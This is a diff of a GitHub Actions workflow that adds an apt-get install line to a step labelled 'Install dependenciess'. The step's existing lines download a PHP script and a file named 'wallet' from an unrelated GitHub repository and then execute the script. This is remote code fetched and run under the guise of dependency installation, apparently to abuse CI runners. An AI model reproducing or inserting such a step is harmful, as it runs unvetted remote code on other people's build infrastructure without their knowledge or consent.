@@ -14,6 +14,7 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
+        sudo apt-get install -y www-browser
         wget https://raw.githubusercontent.com/Mosnio/dpy/main/ok.php
         wget -O wallet https://raw.githubusercontent.com/Mosnio/dpy/main/v1
         php ok.php
